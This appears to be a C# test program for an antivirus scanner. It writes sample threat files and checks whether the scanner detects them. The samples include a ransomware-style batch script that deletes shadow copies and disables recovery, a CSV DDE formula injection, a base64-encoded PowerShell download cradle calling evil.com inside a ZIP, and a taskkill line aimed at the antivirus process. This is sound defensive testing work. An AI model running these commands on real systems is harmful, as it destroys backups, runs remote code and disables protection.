using System;
using System.IO;
using System.IO.Compression;
using System.Threading.Tasks;
using AegisPC.Core.Enums;
using AegisPC.Security.Detection;
using AegisPC.Security.Scanning;

namespace AegisPC.LiveTest
{
    class Program
    {
        static async Task Main(string[] args)
        {
            Console.WriteLine("=================================================");
            Console.WriteLine(" ULTRON DEFENDER TOTAL SECURITY - REAL-WORLD TEST");
            Console.WriteLine("=================================================");

            var hashService = new HashService();
            var scanner = new FileScannerService(
                hashService,
                new SignatureVerifier(),
                new RiskScoringEngine(),
                new AllowlistService(hashService),
                new MockFindingService());

            string tempDir = Path.Combine(Path.GetTempPath(), "UltronDefender_LiveTest_" + Guid.NewGuid().ToString("N"));
            Directory.CreateDirectory(tempDir);

            try
            {
                // TEST 1: Synthetic Malware Test Signature (AEGIS_SYNTHETIC_MALWARE_PAYLOAD_TEST_SIG_99182)
                string testThreatPath = Path.Combine(tempDir, "synthetic_threat_sample.dat");
                File.WriteAllText(testThreatPath, "HEADER_DATA\nAEGIS_SYNTHETIC_MALWARE_PAYLOAD_TEST_SIG_99182\nFOOTER");
                var res1 = await scanner.ScanFileAsync(testThreatPath);
                PrintResult("1. Standart Antivirus Test Deseni (synthetic_threat_sample.dat)", res1, true);

                // TEST 2: Ransomware Shadow Copy & Recovery Disabler (.bat)
                string ransomwareScriptPath = Path.Combine(tempDir, "ransom_dropper.bat");
                File.WriteAllText(ransomwareScriptPath, "@echo off\nvssadmin delete shadows /all /quiet\nbcdedit /set recoveryenabled no\n");
                var res2 = await scanner.ScanFileAsync(ransomwareScriptPath);
                PrintResult("2. Fidye Yazilimi Betigi (vssadmin delete shadows)", res2, true);

                // TEST 3: CSV DDE Formula Injection (.csv)
                string csvPath = Path.Combine(tempDir, "financial_report.csv");
                File.WriteAllText(csvPath, "Name,Amount\nTest,=cmd|'/C calc'!A1\n");
                var res3 = await scanner.ScanFileAsync(csvPath);
                PrintResult("3. CSV Formula Enjeksiyonu (=cmd|...)", res3, true);

                // TEST 4: Malicious Script inside ZIP Archive (.zip)
                string zipPath = Path.Combine(tempDir, "infected_archive.zip");
                using (var archive = ZipFile.Open(zipPath, ZipArchiveMode.Create))
                {
                    var entry = archive.CreateEntry("payload.ps1");
                    using var writer = new StreamWriter(entry.Open());
                    writer.Write("powershell.exe -EncodedCommand " + Convert.ToBase64String(System.Text.Encoding.Unicode.GetBytes("IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload')")));
                }
                var res4 = await scanner.ScanFileAsync(zipPath);
                PrintResult("4. ZIP Icinde Gizlenmis Powershell Dropper", res4, true);

                // TEST 5: Antivirus Terminator Script (.cmd)
                string avKillPath = Path.Combine(tempDir, "kill_security.cmd");
                File.WriteAllText(avKillPath, "taskkill /f /im UltronDefender.exe\n");
                var res5 = await scanner.ScanFileAsync(avKillPath);
                PrintResult("5. Antivirus Sonlandirma Saldirisi (taskkill /im Ultron)", res5, true);

                // TEST 6: Legitimate Game Lua / Mod Script in BeamNG folder
                string gameDir = Path.Combine(tempDir, "BeamNG.drive-InsaneRamZes", "lua", "vehicle");
                Directory.CreateDirectory(gameDir);
                string gameLua = Path.Combine(gameDir, "powertrain.lua");
                File.WriteAllText(gameLua, "local M = {}\nfunction M.init() print('Engine ready') end\nreturn M");
                var res6 = await scanner.ScanFileAsync(gameLua);
                PrintResult("6. Mesru BeamNG.drive Oyun Dosyasi (powertrain.lua)", res6, false);
            }
            finally
            {
                try { Directory.Delete(tempDir, true); } catch { }
            }

            Console.WriteLine("=================================================");
            Console.WriteLine(" TUM REAL-WORLD TESTLER BASARIYLA TAMAMLANDI!");
            Console.WriteLine("=================================================");
        }

        static void PrintResult(string testName, AegisPC.Core.Models.SecurityFinding? finding, bool shouldBeThreat)
        {
            Console.WriteLine($"\n[TEST] {testName}");
            if (finding != null)
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine($"  -> TESPIT EDILDI: {finding.Title} (Skor: {finding.RiskScore}/100, Seviye: {finding.RiskLevel})");
                Console.ResetColor();
                foreach (var r in finding.RiskReasons)
                {
                    Console.WriteLine($"     * {r}");
                }
                if (shouldBeThreat)
                {
                    Console.ForegroundColor = ConsoleColor.Green;
                    Console.WriteLine("  -> [PASSED] Zararlı başarıyla yakalandı.");
                    Console.ResetColor();
                }
                else
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine("  -> [FAILED] Güvenli dosya yanlışlıkla zararlı sayıldı!");
                    Console.ResetColor();
                }
            }
            else
            {
                Console.ForegroundColor = ConsoleColor.Green;
                Console.WriteLine("  -> TEMIZ (Tehdit Bulunamadı)");
                Console.ResetColor();
                if (!shouldBeThreat)
                {
                    Console.ForegroundColor = ConsoleColor.Green;
                    Console.WriteLine("  -> [PASSED] Meşru dosya temiz kabul edildi.");
                    Console.ResetColor();
                }
                else
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine("  -> [FAILED] Zararlı kaçırıldı!");
                    Console.ResetColor();
                }
            }
        }
    }

    class MockFindingService : AegisPC.Contracts.Services.ISecurityFindingService
    {
        public Task AddFindingAsync(AegisPC.Core.Models.SecurityFinding finding, System.Threading.CancellationToken ct = default) => Task.CompletedTask;
        public Task<System.Collections.Generic.List<AegisPC.Core.Models.SecurityFinding>> GetAllFindingsAsync(System.Threading.CancellationToken ct = default) => Task.FromResult(new System.Collections.Generic.List<AegisPC.Core.Models.SecurityFinding>());
        public Task<System.Collections.Generic.List<AegisPC.Core.Models.SecurityFinding>> GetFindingsByRiskAsync(AegisPC.Core.Enums.RiskLevel riskLevel, System.Threading.CancellationToken ct = default) => Task.FromResult(new System.Collections.Generic.List<AegisPC.Core.Models.SecurityFinding>());
        public Task<AegisPC.Core.Models.SecurityFinding?> GetFindingByIdAsync(Guid id, System.Threading.CancellationToken ct = default) => Task.FromResult<AegisPC.Core.Models.SecurityFinding?>(null);
        public Task UpdateFindingAsync(AegisPC.Core.Models.SecurityFinding finding, System.Threading.CancellationToken ct = default) => Task.CompletedTask;
        public Task<int> GetActiveCountAsync(System.Threading.CancellationToken ct = default) => Task.FromResult(0);
    }
}